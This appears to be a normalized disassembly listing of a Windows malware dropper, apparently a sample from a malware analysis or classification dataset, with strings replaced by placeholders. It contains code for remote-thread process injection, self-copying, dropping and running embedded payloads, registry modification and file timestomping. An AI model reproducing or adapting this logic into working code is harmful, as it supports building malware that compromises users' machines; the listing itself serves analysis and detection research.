sub_401000
push ebp
mov ebp esp
sub esp 0x14
lea eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] 0x1
push eax
push 0xf003f
push 0x0
push rw-data
push 0x80000001
mov [ ebp - 0x8 ] 0x4
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
leave
retn
lea eax [ ebp - 0x8 ]
push esi
push eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov esi rw-data
push 0x0
push esi
push [ ebp - 0x4 ]
call [ RegQueryValueExA@IAT ]
lea eax [ ebp - 0xc ]
push 0x4
push eax
push 0x4
push 0x0
push esi
push [ ebp - 0x4 ]
call [ RegSetValueExA@IAT ]
push [ ebp - 0x4 ]
call [ RegCloseKey@IAT ]
pop esi
sub_401071
push ebp
mov ebp esp
sub esp 0x94
push 0x94
lea eax [ ebp - 0x94 ]
push 0x0
push eax
call memset
add esp 0xc
mov [ ebp - 0x94 ] 0x94
push rw-data
push rw-data
call [ GetModuleHandleA@IAT ]
push eax
call [ GetProcAddress@IAT ]
lea ecx [ ebp - 0x94 ]
push ecx
call eax
push 0x5
pop eax
cmp eax [ ebp - 0x90 ]
sbb eax eax
neg eax
leave
retn
sub_4010c9
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x24
push ebx
push esi
push edi
xor esi esi
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x4 ] esi
push [ ebp + 0x8 ]
push esi
push 0x42a
call [ OpenProcess@IAT ]
mov [ ebp - 0x20 ] eax
cmp eax esi
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
call sub_4011a3
mov eax [ ebp - 0x24 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn 0x8
push [ ebp + 0xc ]
call [ lstrlenW@IAT ]
inc eax
mov [ ebp - 0x34 ] eax
lea edi [ eax + eax ]
mov [ ebp - 0x30 ] edi
push 0x4
push 0x1000
push edi
push esi
push [ ebp - 0x20 ]
call [ VirtualAllocEx@IAT ]
mov ebx eax
mov [ ebp - 0x28 ] ebx
cmp ebx esi
je r-xdata
push esi
push edi
push [ ebp + 0xc ]
push ebx
push [ ebp - 0x20 ]
call [ WriteProcessMemory@IAT ]
test eax eax
je r-xdata
push rw-data
push rw-data
call [ GetModuleHandleA@IAT ]
push eax
call [ GetProcAddress@IAT ]
mov [ ebp - 0x2c ] eax
cmp eax esi
je r-xdata
push esi
push esi
push ebx
push eax
push esi
push esi
push [ ebp - 0x20 ]
call [ CreateRemoteThread@IAT ]
mov [ ebp - 0x1c ] eax
cmp eax esi
je r-xdata
mov [ ebp - 0x24 ] 0x1
sub_4011a4
push ebp
mov ebp esp
sub esp 0x1ac
and [ ebp - 0x1ac ] 0x0
push esi
push edi
push 0x49
pop ecx
xor eax eax
lea edi [ ebp - 0x1a8 ]
push eax
[ edi ]
push 0x2
call CreateToolhelp32Snapshot
cmp eax 0xffffffff
mov [ ebp - 0x4 ] eax
je r-xdata
xor eax eax
lea ecx [ ebp - 0x1ac ]
mov [ ebp - 0x1ac ] 0x128
push ecx
push eax
call Process32First
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call [ CloseHandle@IAT ]
and [ ebp - 0x84 ] 0x0
push 0x1f
pop ecx
xor eax eax
lea edi [ ebp - 0x83 ]
push [ ebp + 0x8 ]
[ edi ]
mov esi [ _stricmp@IAT ]
stosw [ edi ]
stosb [ edi ]
lea eax [ ebp - 0x188 ]
push eax
mov eax [ ebp - 0x1a4 ]
jmp r-xdata
lea eax [ ebp - 0x188 ]
push 0x2e
push eax
call [ _mbsrchr@IAT ]
pop ecx
test eax eax
pop ecx
je r-xdata
pop edi
pop esi
leave
retn
lea eax [ ebp - 0x1ac ]
push eax
push [ ebp - 0x4 ]
call Process32Next
test eax eax
je r-xdata
lea ecx [ ebp - 0x188 ]
sub eax ecx
push eax
lea eax [ ebp - 0x188 ]
push eax
lea eax [ ebp - 0x84 ]
push eax
call [ strncpy@IAT ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x84 ]
push eax
call esi
add esp 0x14
test eax eax
je r-xdata
and [ ebp - 0x84 ] 0x0
push 0x1f
pop ecx
xor eax eax
lea edi [ ebp - 0x83 ]
push [ ebp + 0x8 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ ebp - 0x188 ]
push eax
jmp r-xdata
call esi
pop ecx
test eax eax
pop ecx
je r-xdata
sub_4012ba
push ebp
mov ebp esp
sub esp 0x750
push ebx
and [ ebp - 0x270 ] 0x0
push esi
mov esi [ ebp + 0x8 ]
push edi
push 0x41
pop ecx
xor eax eax
lea edi [ ebp - 0x26f ]
push 0x3
push rw-data
push esi
[ edi ]
call [ strncmp@IAT ]
add esp 0xc
test eax eax
jne r-xdata
and [ ebp - 0x168 ] 0x0
push 0x41
pop ecx
xor eax eax
and [ ebp - 0x47c ] al
lea edi [ ebp - 0x167 ]
[ edi ]
mov ecx 0x82
lea edi [ ebp - 0x47b ]
[ edi ]
mov esi 0x104
lea eax [ ebp - 0x168 ]
push esi
xor edi edi
push eax
push edi
mov [ ebp - 0x8 ] esi
call [ GetModuleFileNameA@IAT ]
lea eax [ ebp - 0x544 ]
push rw-data
push eax
call [ lstrcpyA@IAT ]
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x544 ]
push eax
push 0x80000001
call [ RegOpenKeyA@IAT ]
test eax eax
jne r-xdata
add esi 0x3
push esi
call [ DeleteFileA@IAT ]
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x47c ]
push eax
lea eax [ ebp - 0xc ]
push eax
push edi
push rw-data
push [ ebp - 0x4 ]
call [ RegQueryValueExA@IAT ]
push [ ebp - 0x4 ]
call [ RegCloseKey@IAT ]
lea eax [ ebp - 0x47c ]
push rw-data
push eax
call strcat
lea eax [ ebp - 0x168 ]
push eax
lea eax [ ebp - 0x47c ]
push eax
call strcmp
add esp 0x10
test eax eax
je r-xdata
lea eax [ ebp - 0x270 ]
push esi
push eax
push rw-data
call [ ExpandEnvironmentStringsA@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x47c ]
push edi
push eax
lea eax [ ebp - 0x168 ]
push eax
call [ CopyFileA@IAT ]
push 0x44
lea eax [ ebp - 0x60 ]
pop esi
push esi
push edi
push eax
call memset
push 0x10
lea eax [ ebp - 0x1c ]
push edi
push eax
mov [ ebp - 0x60 ] esi
call memset
lea eax [ ebp - 0x47c ]
push rw-data
push eax
call strcat
lea eax [ ebp - 0x168 ]
push eax
lea eax [ ebp - 0x47c ]
push eax
call strcat
add esp 0x28
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x60 ]
push eax
push edi
push edi
push edi
push edi
push edi
lea eax [ ebp - 0x47c ]
push edi
push eax
push edi
call [ CreateProcessA@IAT ]
jmp r-xdata
lea eax [ ebp - 0x270 ]
push rw-data
push eax
call [ lstrcatA@IAT ]
lea eax [ ebp - 0x270 ]
push rw-data
push eax
call [ fopen@IAT ]
pop ecx
cmp eax edi
pop ecx
mov [ ebp + 0x8 ] eax
je r-xdata
mov edi [ fwrite@IAT ]
mov ebx 0x190
push eax
push ebx
push 0x1
push r--data
call edi
add esp 0x10
cmp eax ebx
push [ ebp + 0x8 ]
jne r-xdata
call [ fclose@IAT ]
pop ecx
jmp r-xdata
mov ebx 0xb470
push ebx
push 0x1
push r--data
call edi
add esp 0x10
cmp eax ebx
push [ ebp + 0x8 ]
je r-xdata
call [ fclose@IAT ]
and [ ebp - 0x750 ] 0x0
pop ecx
mov ecx 0x82
xor eax eax
lea edi [ ebp - 0x74e ]
push esi
[ edi ]
lea eax [ ebp - 0x750 ]
push eax
push rw-data
call [ ExpandEnvironmentStringsW@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x750 ]
push rw-data
push eax
call [ lstrcatW@IAT ]
push rw-data
call sub_4011a4
pop ecx
lea ecx [ ebp - 0x750 ]
push ecx
push eax
call sub_4010c9
sub_40152a
push ebp
mov ebp esp
sub esp 0x390
push ebx
push esi
push edi
call sub_401071
test eax eax
je r-xdata
and [ ebp - 0x180 ] 0x0
push 0x41
mov esi [ ExpandEnvironmentStringsA@IAT ]
pop ecx
xor eax eax
lea edi [ ebp - 0x17f ]
[ edi ]
mov ebx 0x104
lea eax [ ebp - 0x180 ]
push ebx
push eax
push rw-data
call esi
test eax eax
je r-xdata
push [ ebp + 0x10 ]
call sub_4012ba
jmp r-xdata
pop edi
pop esi
xor eax eax
pop ebx
leave
retn 0x10
lea eax [ ebp - 0x180 ]
push rw-data
push eax
call strcat
lea eax [ ebp - 0x180 ]
push rw-data
push eax
call [ fopen@IAT ]
add esp 0x10
mov [ ebp + 0x10 ] eax
test eax eax
je r-xdata
pop ecx
jmp r-xdata
mov edi [ fwrite@IAT ]
push eax
push 0x190
push 0x1
push r--data
call edi
add esp 0x10
cmp eax 0x190
push [ ebp + 0x10 ]
jne r-xdata
call [ fclose@IAT ]
push 0xb470
push 0x1
push r--data
call edi
add esp 0x10
cmp eax 0xb470
push [ ebp + 0x10 ]
je r-xdata
call [ fclose@IAT ]
and [ ebp - 0x288 ] 0x0
pop ecx
push 0x41
xor eax eax
pop ecx
lea edi [ ebp - 0x287 ]
[ edi ]
lea eax [ ebp - 0x288 ]
push ebx
push eax
push rw-data
call esi
test eax eax
je r-xdata
lea eax [ ebp - 0x288 ]
push rw-data
push eax
call strcat
pop ecx
lea eax [ ebp - 0x24 ]
pop ecx
xor edi edi
push eax
lea eax [ ebp - 0x288 ]
push edi
push eax
call [ GetFileAttributesExA@IAT ]
test eax eax
je r-xdata
call sub_401000
and [ ebp - 0x390 ] 0x0
push 0x41
pop ecx
xor eax eax
lea edi [ ebp - 0x38f ]
push 0x44
[ edi ]
pop edi
push edi
push eax
lea eax [ ebp - 0x78 ]
push eax
call memset
push 0x10
lea eax [ ebp - 0x34 ]
push 0x0
push eax
mov [ ebp - 0x78 ] edi
call memset
add esp 0x18
lea eax [ ebp - 0x390 ]
push ebx
push eax
push rw-data
call esi
test eax eax
je r-xdata
push edi
push 0x80
push 0x3
push edi
push 0x1
lea eax [ ebp - 0x180 ]
push 0x100
push eax
call [ CreateFileA@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
lea eax [ ebp - 0x390 ]
push rw-data
push eax
call strcat
pop ecx
lea eax [ ebp - 0x390 ]
pop ecx
push 0x0
push eax
call [ WinExec@IAT ]
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
push edi
call [ SetFileTime@IAT ]
push edi
call [ CloseHandle@IAT ]
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x68
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x2
call [ __set_app_type@IAT ]
pop ecx
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
call [ __p__fmode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rw-data ] eax
call sub_4018bb
cmp [ rw-data ] ebx
jne r-xdata
call sub_4018a6
push rw-data
push rw-data
call _initterm
mov eax [ rw-data ]
mov [ ebp - 0x6c ] eax
lea eax [ ebp - 0x6c ]
push eax
push [ rw-data ]
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
call [ __getmainargs@IAT ]
push rw-data
push rw-data
call _initterm
add esp 0x24
mov eax [ _acmdln@IAT ]
mov esi [ eax ]
mov [ ebp - 0x74 ] esi
cmp [ esi ] 0x22
jne r-xdata
push sub_4018b8
call [ __setusermatherr@IAT ]
pop ecx
cmp [ esi ] 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
mov al [ esi ]
cmp al bl
je r-xdata
mov al [ esi ]
cmp al bl
je r-xdata
inc esi
mov [ ebp - 0x74 ] esi
jmp r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp al 0x22
jne r-xdata
mov [ ebp - 0x30 ] ebx
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
test [ ebp - 0x30 ] 0x1
je r-xdata
cmp al 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp r-xdata
push eax
push esi
push ebx
push ebx
call [ GetModuleHandleA@IAT ]
push eax
call sub_40152a
mov [ ebp - 0x68 ] eax
push eax
call [ exit@IAT ]
sub_4011a3
retn
Process32Next
jmp [ Process32Next@IAT ]
Process32First
jmp [ Process32First@IAT ]
CreateToolhelp32Snapshot
jmp [ CreateToolhelp32Snapshot@IAT ]
strcat
jmp [ strcat@IAT ]
memset
jmp [ memset@IAT ]
_except_handler3
jmp [ _except_handler3@IAT ]
strcmp
jmp [ strcmp@IAT ]
_XcptFilter
jmp [ _XcptFilter@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_4018a6
push 0x30000
push 0x10000
call _controlfp
pop ecx
pop ecx
retn
sub_4018b8
xor eax eax
retn
sub_4018bb
retn
_controlfp
jmp [ _controlfp@IAT ]
